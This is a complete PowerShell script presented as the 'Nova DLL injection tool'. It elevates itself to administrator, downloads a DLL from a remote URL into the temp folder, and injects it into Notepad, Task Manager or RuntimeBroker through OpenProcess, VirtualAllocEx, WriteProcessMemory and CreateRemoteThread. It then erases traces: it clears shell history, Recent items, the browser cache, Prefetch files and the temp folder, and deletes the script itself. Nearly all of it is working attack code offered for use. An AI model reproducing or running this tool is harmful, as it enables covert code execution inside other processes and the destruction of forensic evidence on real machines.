# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-NoExit",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# === LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    } else {
        $kernel32 = [Win32.Kernel32]
    }
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# === 1. Prepare Temp ===
Write-Host "[+] Preparing environment..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
} catch {}

# === 2. Download DLL + Images ===
$randomGuid = [System.Guid]::NewGuid().ToString()
$dllPath = Join-Path $tempDir "$randomGuid.dll"

$baseUrl = ""

$files = @{
    $dllPath                          = "$baseUrl/Nova.dll"
    "$tempDir\logo.png"               = "$baseUrl/logo.png"
    "$tempDir\low.png"                = "$baseUrl/low.png"
    "$tempDir\medium.png"             = "$baseUrl/medium.png"
    "$tempDir\high.png"               = "$baseUrl/high.png"
}

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

Write-Host "[+] Downloading Nova.dll and assets..." -ForegroundColor Cyan

$downloaded = $false
foreach ($dest in $files.Keys) {
    $url = $files[$dest]
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
    } catch {
        # Silent fail for images
    }
}

# Verify DLL
if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
    $downloaded = $true
    Write-Host "[+] DLL ready ($([math]::Round((Get-Item $dllPath).Length/1KB, 2)) KB)" -ForegroundColor Green
} else {
    Write-Host "[!] Failed to download Nova.dll" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# === 3. Process Selection ===
Clear-Host
Write-Host "NOVA DLL INJECTION TOOL" -ForegroundColor Yellow
Write-Host ""
Write-Host "Select target process for injection:" -ForegroundColor White
Write-Host ""
Write-Host "  [1] Notepad" -ForegroundColor Green
Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
Write-Host "  [3] RuntimeBroker" -ForegroundColor Green
Write-Host ""

$proc = $null
$targetProcess = ""
$validChoice = $false

do {
    $choice = Read-Host "Enter choice (1-3)"
    Write-Host ""

    switch ($choice) {
        "1" {
            $targetProcess = "notepad"
            try {
                $existingProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($existingProc) {
                    Write-Host "[+] Found existing Notepad.exe (PID: $($existingProc.Id))" -ForegroundColor Green
                    $proc = $existingProc
                } else {
                    Write-Host "[+] Starting Notepad.exe..." -ForegroundColor Cyan
                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 2
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                }
                $validChoice = $true
            } catch {
                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        "2" {
            $targetProcess = "Taskmgr"
            try {
                $existingProc = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($existingProc) {
                    Write-Host "[+] Found existing Task Manager (PID: $($existingProc.Id))" -ForegroundColor Green
                    $proc = $existingProc
                } else {
                    Write-Host "[+] Starting Task Manager..." -ForegroundColor Cyan
                    $proc = Start-Process -FilePath "taskmgr.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 3
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                }
                $validChoice = $true
            } catch {
                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        "3" {
            $targetProcess = "RuntimeBroker"
            try {
                $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($proc) {
                    Write-Host "[+] Found RuntimeBroker.exe (PID: $($proc.Id))" -ForegroundColor Green
                    $validChoice = $true
                } else {
                    Write-Host "[!] RuntimeBroker not found. Using Notepad as fallback..." -ForegroundColor Yellow
                    $targetProcess = "notepad"
                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 2
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                    $validChoice = $true
                }
            } catch {
                Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        default {
            Write-Host "[!] Invalid choice. Please enter 1, 2, or 3." -ForegroundColor Red
        }
    }

    if (-not $validChoice) {
        Write-Host "[!] Failed to get a valid process. Try again..." -ForegroundColor Red
        Read-Host
        Clear-Host
        Write-Host "NOVA DLL INJECTION TOOL" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  [1] Notepad" -ForegroundColor Green
        Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
        Write-Host "  [3] RuntimeBroker" -ForegroundColor Green
        Write-Host ""
    }
} while (-not $validChoice -or -not $proc)

if (-not $proc) {
    Write-Host "[!] No target process. Exiting..." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

try {
    $proc = Get-Process -Id $proc.Id -ErrorAction Stop
} catch {
    Write-Host "[!] Process no longer accessible. Exiting..." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

$pid1 = $proc.Id
Write-Host ""
Write-Host "[+] Target: $targetProcess (PID: $pid1)" -ForegroundColor Green
Write-Host "[+] Injecting: Nova.dll" -ForegroundColor Green
Write-Host ""

# === 4. Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )

    Write-Host "[+] Opening process handle..." -ForegroundColor Cyan
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[!] Trying limited permissions..." -ForegroundColor Yellow
        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "[!] Failed to open process handle" -ForegroundColor Red
            Read-Host "Press Enter to exit"
            exit 1
        }
    }
    Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green

    Write-Host "[+] Allocating memory..." -ForegroundColor Cyan
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green

    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero

    Write-Host "[+] Writing DLL path..." -ForegroundColor Cyan
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    if (-not $res) {
        Write-Host "[!] Failed to write memory" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }

    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
    Write-Host "[+] Creating remote thread..." -ForegroundColor Cyan
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)

    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host ""
        Write-Host "[+] INJECTION SUCCESSFUL!" -ForegroundColor Green
        Write-Host "[+] Nova.dll loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
    } else {
        Write-Host "[!] Injection failed. Try a different process." -ForegroundColor Red
    }
} catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}

# === 5. Cleanup ===
Write-Host ""
Write-Host "[+] Cleaning up..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { try { Set-Content -Path $histPath -Value "" -Force } catch {} }

$cleanPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"),
    (Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache")
)
foreach ($p in $cleanPaths) {
    if (Test-Path $p) {
        Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }
}

$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
    try { Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
}

[GC]::Collect()
[GC]::WaitForPendingFinalizers()

Write-Host "[+] Cleanup complete" -ForegroundColor Green
Write-Host ""
Write-Host "Press Enter to exit..."
Read-Host
exit
